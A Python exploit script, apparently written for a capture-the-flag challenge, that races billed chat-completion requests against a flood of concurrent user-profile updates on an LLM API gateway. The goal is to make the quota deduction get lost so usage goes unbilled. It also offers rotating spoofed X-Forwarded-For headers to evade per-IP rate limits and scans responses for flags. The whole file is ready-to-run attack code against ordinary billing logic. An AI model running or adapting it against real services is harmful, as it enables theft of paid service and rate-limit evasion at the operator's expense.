#!/usr/bin/env python3
"""Bounded lost-update probe for authorized payment/quota race testing."""

from __future__ import annotations

import argparse
import json
import re
import threading
import time
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from typing import Any

import requests


FLAG_RE = re.compile(r"(?:flag|ctf|dasctf)\{[^}\r\n]{1,256}\}", re.I)
TLS = threading.local()


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Payment/quota lost-update differential probe")
    p.add_argument("--base", required=True, help="例如 https://target")
    p.add_argument("--cookie", required=True, help="session=... 或完整 Cookie")
    p.add_argument("--uid", required=True, help="New-Api-User 值")
    p.add_argument("--key", required=True, help="触发计费请求的 Bearer API key")
    p.add_argument("--model", required=True)
    p.add_argument("--self-path", default="/api/user/self")
    p.add_argument("--trigger-path", default="/v1/chat/completions")
    p.add_argument("--update-json", default='{"language":"en"}')
    p.add_argument("--prompt", default="Reply with exactly: OK")
    p.add_argument("--max-tokens", type=int, default=8)
    p.add_argument("--trigger-count", type=int, default=2)
    p.add_argument("--trigger-workers", type=int, default=2)
    p.add_argument("--shield-workers", type=int, default=8)
    p.add_argument("--warmup", type=float, default=1.0)
    p.add_argument("--settle", type=float, default=3.0)
    p.add_argument("--timeout", type=float, default=15.0)
    p.add_argument("--baseline", action="store_true",
                   help="先执行同数量、无竞争的计费请求，建立成本对照")
    p.add_argument("--xff", action="store_true",
                   help="仅在已确认反代信任边界后使用随机 XFF；默认关闭")
    p.add_argument("--insecure", action="store_true", help="关闭 TLS 证书校验")
    p.add_argument("--out", default="lost_update_evidence.json")
    return p.parse_args()


def session(verify: bool) -> requests.Session:
    s = getattr(TLS, "session", None)
    if s is None:
        s = requests.Session()
        s.verify = verify
        s.headers["User-Agent"] = "ReverseLab-LostUpdateProbe/1.0"
        TLS.session = s
    return s


def cookie_value(raw: str) -> str:
    return raw if "=" in raw else f"session={raw}"


def user_headers(args: argparse.Namespace, seq: int | None = None) -> dict[str, str]:
    h = {
        "Cookie": cookie_value(args.cookie),
        "New-Api-User": str(args.uid),
        "Content-Type": "application/json",
    }
    if args.xff and seq is not None:
        # 文档探针使用 TEST-NET-3，避免把随机公网地址写入日志。
        ip = f"203.0.113.{seq % 250 + 1}"
        h.update({"X-Forwarded-For": ip, "X-Real-IP": ip})
    return h


def summarize(r: requests.Response, started: float) -> dict[str, Any]:
    text = r.text[:4096]
    return {
        "status": r.status_code,
        "elapsed_ms": round((time.perf_counter() - started) * 1000, 2),
        "length": len(r.content),
        "body": text,
        "flags": sorted(set(FLAG_RE.findall(text))),
    }


def get_self(args: argparse.Namespace) -> dict[str, Any]:
    started = time.perf_counter()
    r = session(not args.insecure).get(
        args.base.rstrip("/") + args.self_path,
        headers=user_headers(args), timeout=args.timeout,
    )
    out = summarize(r, started)
    try:
        out["json"] = r.json()
        data = out["json"].get("data", {})
        out["quota"] = data.get("quota")
    except (ValueError, AttributeError):
        out["quota"] = None
    return out


def trigger(args: argparse.Namespace, seq: int) -> dict[str, Any]:
    started = time.perf_counter()
    body = {
        "model": args.model,
        "messages": [{"role": "user", "content": args.prompt}],
        "max_tokens": args.max_tokens,
    }
    try:
        r = session(not args.insecure).post(
            args.base.rstrip("/") + args.trigger_path,
            headers={"Authorization": f"Bearer {args.key}", "Content-Type": "application/json"},
            json=body, timeout=args.timeout,
        )
        return {"seq": seq, **summarize(r, started)}
    except requests.RequestException as exc:
        return {"seq": seq, "error": repr(exc), "elapsed_ms": round((time.perf_counter() - started) * 1000, 2)}


def run_triggers(args: argparse.Namespace) -> list[dict[str, Any]]:
    results: list[dict[str, Any]] = []
    workers = max(1, min(args.trigger_workers, args.trigger_count))
    with ThreadPoolExecutor(max_workers=workers) as pool:
        futures = [pool.submit(trigger, args, i) for i in range(args.trigger_count)]
        for future in as_completed(futures):
            results.append(future.result())
    return sorted(results, key=lambda x: x["seq"])


def shield_worker(
    args: argparse.Namespace,
    worker_id: int,
    update_body: dict[str, Any],
    stop: threading.Event,
    stats: Counter,
    lock: threading.Lock,
) -> None:
    seq = worker_id
    while not stop.is_set():
        started = time.perf_counter()
        try:
            r = session(not args.insecure).put(
                args.base.rstrip("/") + args.self_path,
                headers=user_headers(args, seq), json=update_body, timeout=args.timeout,
            )
            bucket = str(r.status_code)
            flags = FLAG_RE.findall(r.text[:4096])
            with lock:
                stats[bucket] += 1
                stats["latency_ms_sum"] += int((time.perf_counter() - started) * 1000)
                for flag in flags:
                    stats[f"flag:{flag}"] += 1
            if r.status_code == 429:
                time.sleep(0.2)
        except requests.RequestException:
            with lock:
                stats["error"] += 1
        seq += args.shield_workers


def quota_delta(before: dict[str, Any], after: dict[str, Any]) -> int | float | None:
    a, b = before.get("quota"), after.get("quota")
    if isinstance(a, (int, float)) and isinstance(b, (int, float)):
        return b - a
    return None


def main() -> int:
    args = parse_args()
    if args.trigger_count < 1 or args.shield_workers < 1:
        raise SystemExit("trigger-count 和 shield-workers 必须大于 0")
    try:
        update_body = json.loads(args.update_json)
    except json.JSONDecodeError as exc:
        raise SystemExit(f"--update-json 不是合法 JSON: {exc}") from exc
    if not isinstance(update_body, dict):
        raise SystemExit("--update-json 必须是 JSON object")

    evidence: dict[str, Any] = {
        "target": {"base": args.base, "self_path": args.self_path, "trigger_path": args.trigger_path,
                   "uid": str(args.uid), "model": args.model},
        "config": {"trigger_count": args.trigger_count, "trigger_workers": args.trigger_workers,
                   "shield_workers": args.shield_workers, "update_body": update_body,
                   "xff": args.xff, "tls_verify": not args.insecure},
    }

    if args.baseline:
        baseline_before = get_self(args)
        baseline_results = run_triggers(args)
        time.sleep(args.settle)
        baseline_after = get_self(args)
        evidence["baseline"] = {
            "before": baseline_before, "requests": baseline_results, "after": baseline_after,
            "quota_delta": quota_delta(baseline_before, baseline_after),
        }

    race_before = get_self(args)
    if race_before.get("status") != 200 or race_before.get("quota") is None:
        raise SystemExit(f"无法读取初始 quota: HTTP {race_before.get('status')}")

    stop = threading.Event()
    stats: Counter = Counter()
    lock = threading.Lock()
    with ThreadPoolExecutor(max_workers=args.shield_workers) as pool:
        jobs = [pool.submit(shield_worker, args, i, update_body, stop, stats, lock)
                for i in range(args.shield_workers)]
        time.sleep(args.warmup)
        race_results = run_triggers(args)
        stop.set()
        for job in jobs:
            job.result()

    time.sleep(args.settle)
    race_after = get_self(args)
    evidence["race"] = {
        "before": race_before, "shield_stats": dict(stats), "requests": race_results,
        "after": race_after, "quota_delta": quota_delta(race_before, race_after),
    }

    all_text = json.dumps(evidence, ensure_ascii=False)
    evidence["flags"] = sorted(set(FLAG_RE.findall(all_text)))
    out = Path(args.out)
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(json.dumps(evidence, ensure_ascii=False, indent=2), encoding="utf-8")

    base_delta = evidence.get("baseline", {}).get("quota_delta")
    race_delta = evidence["race"]["quota_delta"]
    print(f"baseline_delta={base_delta} race_delta={race_delta}")
    print(f"shield_stats={dict(stats)}")
    print(f"evidence={out.resolve()}")
    for flag in evidence["flags"]:
        print(f"FLAG: {flag}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
